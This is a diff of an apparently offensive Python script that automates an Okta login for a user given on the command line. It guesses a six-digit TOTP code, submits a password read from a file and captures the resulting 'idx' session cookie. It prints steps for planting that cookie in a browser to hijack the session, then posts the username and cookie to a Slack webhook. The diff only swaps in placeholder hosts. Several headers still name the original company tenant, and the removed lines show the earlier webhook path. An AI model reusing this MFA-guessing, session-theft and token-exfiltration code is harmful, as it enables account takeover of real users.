@@ -15,7 +15,7 @@ print()
 # Use requests' Session class to store cookies
 s = requests.Session()
 
-url = "https://indeed.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED"
+url = "https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 response = s.get(url, headers = head)
@@ -24,7 +24,7 @@ response = s.get(url, headers = head)
 # Send GET to /oauth2/v1/authorize?client_id
 #
 
-url = "https://indeed.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&code_challenge=_TAFReuR-zWk4iGVKZBrxcFsQTQYL3Ez08JdB5yHUEQ&code_challenge_method=S256&nonce=K9aFEL8fb5jpESRGKYVMHhq7egBraQaF8JynRMM8HXlOMhhJ5yCTNsF0copdZvfY&redirect_uri=https%3A%2F%2Findeed.okta.com%2Fenduser%2Fcallback&response_type=code&state=M7Dod5TYUPJg2z6D5E4jju0OCvenshQ0P4SSNwPeJobZA4cXTrrbMgBqW56tsTyZ&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
+url = "https://domain.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&code_challenge=_TAFReuR-zWk4iGVKZBrxcFsQTQYL3Ez08JdB5yHUEQ&code_challenge_method=S256&nonce=K9aFEL8fb5jpESRGKYVMHhq7egBraQaF8JynRMM8HXlOMhhJ5yCTNsF0copdZvfY&redirect_uri=https%3A%2F%2Findeed.okta.com%2Fenduser%2Fcallback&response_type=code&state=M7Dod5TYUPJg2z6D5E4jju0OCvenshQ0P4SSNwPeJobZA4cXTrrbMgBqW56tsTyZ&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 #response = s.get(url, proxies=proxies, headers=head, verify=False)
@@ -40,7 +40,7 @@ for line in r.splitlines():
 # POST to /idp/idx/authenticators/poll/cancel
 #
 
-url = "https://indeed.okta.com/idp/idx/authenticators/poll/cancel"
+url = "https://domain.okta.com/idp/idx/authenticators/poll/cancel"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 jobj = {"reason":"OV_UNREACHABLE_BY_LOOPBACK","statusCode":None,"stateHandle":stateToken[0]}
 
@@ -63,7 +63,7 @@ r_dict = json.loads(r)
 # POST to /idp/idx/identify
 #
 
-url = "https://indeed.okta.com/idp/idx/identify"
+url = "https://domain.okta.com/idp/idx/identify"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 jobj = {"identifier":sys.argv[1],"stateHandle":r_dict['stateHandle']}
@@ -80,7 +80,7 @@ authid = r_dict["remediation"]["value"][0]["value"][0]["options"][0]["value"]["f
 # POST to /idp/idx/challenge #1
 #
 
-url = "https://indeed.okta.com/idp/idx/challenge"
+url = "https://domain.okta.com/idp/idx/challenge"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 jobj = {"authenticator":{"id":authid,"methodType":"totp"},"stateHandle":r_dict['stateHandle']}
@@ -96,11 +96,11 @@ authidpass = r_dict["remediation"]["value"][1]["value"][0]["options"][1]["value"
 # POST to /idp/idx/challenge/answer (TOTP passcode)
 #
 
-url = "https://indeed.okta.com/idp/idx/challenge/answer"
+url = "https://domain.okta.com/idp/idx/challenge/answer"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
-s.cookies.set("ln", sys.argv[1], domain="indeed.okta.com")
-s.cookies.set("okta_user_lang", "en", domain="indeed.okta.com")
+s.cookies.set("ln", sys.argv[1], domain="domain.okta.com")
+s.cookies.set("okta_user_lang", "en", domain="domain.okta.com")
 
 #
 # Need to make passcode guess a random 6 digit number here
@@ -139,7 +139,7 @@ r_dict = json.loads(r)
 # POST to /idp/idx/challenge #2
 #
 
-url = "https://indeed.okta.com/idp/idx/challenge"
+url = "https://domain.okta.com/idp/idx/challenge"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 jobj = {"authenticator":{"id":authidpass},"stateHandle":r_dict['stateHandle']}
@@ -162,7 +162,7 @@ authid = r_dict["remediation"]["value"][1]["value"][0]["options"][1]["value"]["f
 with open('pass.txt') as f:
     passw = f.readline().strip('\n')
 
-url = "https://indeed.okta.com/idp/idx/challenge/answer"
+url = "https://domain.okta.com/idp/idx/challenge/answer"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 jobj = {"credentials":{"passcode":passw},"stateHandle":r_dict['stateHandle']}
@@ -181,16 +181,16 @@ r_dict = json.loads(r)
 #
 
 stateHandle2=r_dict['stateHandle'][:-4]
-url = "https://indeed.okta.com/login/token/redirect?stateToken="+stateHandle2
+url = "https://domain.okta.com/login/token/redirect?stateToken="+stateHandle2
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 response = s.get(url, headers = head)
 
 #
-# GET /app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED
+# GET /app/UserHome?iss=https%3A%2F%2Fdomain.okta.com&session_hint=AUTHENTICATED
 #
 
-url = "https://indeed.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED"
+url = "https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED"
 head = {"Content-Type":"application/json","X-Okta-User-Agent-Extended":"okta-auth-js/7.0.1 okta-signin-widget-7.8.1","X-Device-Fingerprint":"WrGsn-ZyoWaADCl_ZNA4kQYIDwcYSIco|5e38afbedb05a78505b912c4fc3edbb114e777d6d248ec594217178c0088db05|18edbf8de871b19953ccb24879cb0765","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36","Accept":"application/json; okta-version=1.0.0","Origin":"https://indeed.okta.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}
 
 response = s.get(url, headers = head)
@@ -199,13 +199,13 @@ print()
 print("Your Okta session is waiting")
 print()
 print("To claim your session:")
-print("- Point a browser to https://indeed.okta.com")
+print("- Point a browser to https://domain.okta.com")
 print("- Add a cookie named idx with this value:")
 print()
 idxvalue = s.cookies.get_dict()['idx']
 print(idxvalue)
 print()
-print("- Browse to https://indeed.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED")
+print("- Browse to https://domain.okta.com/app/UserHome?iss=https%3A%2F%2Findeed.okta.com&session_hint=AUTHENTICATED")
 print()
 print("Enjoy!")
 print()
@@ -216,6 +216,6 @@ print()
 
 webh = {"username":sys.argv[1],"idx":idxvalue}
 
-url = "https://hooks.slack.com/workflows/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"
+url = "https://hooks.slack.com/workflows/blahblah"
 jsend = json.dumps(webh)
 response = s.post(url, data = jsend)
